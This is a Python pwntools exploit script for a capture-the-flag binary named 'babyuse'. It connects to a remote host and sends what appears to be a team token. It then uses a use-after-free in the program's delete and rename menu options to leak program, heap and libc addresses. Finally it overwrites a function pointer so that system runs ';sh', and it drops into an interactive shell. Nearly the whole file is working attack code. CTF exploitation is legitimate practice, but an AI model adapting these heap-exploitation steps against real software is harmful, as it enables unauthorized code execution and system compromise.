from pwn import *

context.log_level = "DEBUG"

local = False
if local:
    r = process('./babyuse')
else:
    r = remote('202.112.51.247', 3456)

pause()

if not local:
    r.sendline('nFd70NUmjD3pMKOlyPdjdRlJ6PiucTx3')

def setup(n):
    for i in range(n):
        r.sendline('1')
        r.recvuntil('95\n')
        r.sendline('1')
        r.recvuntil('name')
        r.sendline(str(0x54))
        r.recvuntil('name')
        r.sendline('A'*0x20)
        r.recvuntil('Exit')

def delete(n):
    r.sendline('6')
    r.recvline()
    r.sendline(str(n))
    r.recvuntil('Exit')

r.recvuntil('Exit')
setup(4)

# Select and delete 3
r.sendline('2')
r.recvline()
r.sendline('3')
r.recvuntil('Exit')

delete(3)

# Rename 1 filling the space 3 took up with the string
r.sendline('4')
r.recvline()
r.sendline('1')
r.recvline()
r.sendline('12')
r.recvline()
r.sendline('B'*4)

r.recvuntil('Exit')

# Use currently selected to leak addr
r.sendline('5')

r.recvuntil('Select gun ')
prgm_base = u32(r.recv(4)) - 0x1d30
print hex(prgm_base)

# Return to menu
r.sendline('4')

# Select and delete 2
r.sendline('2')
r.recvline()
r.sendline('2')
r.recvuntil('Exit')

delete(2)

# Rename 0
r.sendline('4')
r.recvline()
r.sendline('0')
r.recvline()
r.sendline('12')
r.recvline()
r.sendline('B'*4 + p32(prgm_base+0x408c))

r.recvuntil('Exit')

# Use to leak heap ptr
r.sendline('5')

r.recvuntil('Select gun ')
heap_base = u32(r.recv(4)) - 0x4a10
print hex(heap_base)

r.sendline('4')

# Select and delete 1
r.sendline('2')
r.recvline()
r.sendline('1')
r.recvuntil('Exit')

delete(1)

# Rename 0
r.sendline('4')
r.recvline()
r.sendline('0')
r.recvline()
r.sendline('12')
r.recvline()
r.sendline('B'*4 + p32(prgm_base+0x3fc8))

r.recvuntil('Exit')

# Use to leak libc
r.sendline('5')

r.recvuntil('Select gun ')
libc = ELF('libc.so')
libc.address = u32(r.recv(4)) - libc.symbols['read']
print hex(libc.address)

r.sendline('4')

r.recvuntil('Exit')



delete(0)

setup(2)

# Select and delete 1
r.sendline('2')
r.recvline()
r.sendline('1')
r.recvuntil('Exit')

delete(1)

# Rename 0
r.sendline('4')
r.recvline()
r.recvline()
r.sendline('0')
r.recvline()
r.sendline('12')
r.recvline()
r.sendline(p32(heap_base+0x4a8c) + p32(libc.symbols['system']) + ';sh')

pause()

r.sendline('5')
r.sendline('1')

r.recvuntil('Exit')

r.interactive()
